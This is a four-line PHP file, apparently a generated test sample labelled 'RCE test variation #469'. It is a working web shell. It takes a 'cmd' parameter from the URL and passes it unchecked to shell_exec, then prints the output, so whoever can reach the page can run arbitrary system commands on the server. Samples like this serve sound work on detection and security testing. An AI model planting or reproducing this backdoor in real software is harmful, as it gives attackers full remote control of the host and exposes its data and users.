<?php
// RCE test variation #469
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>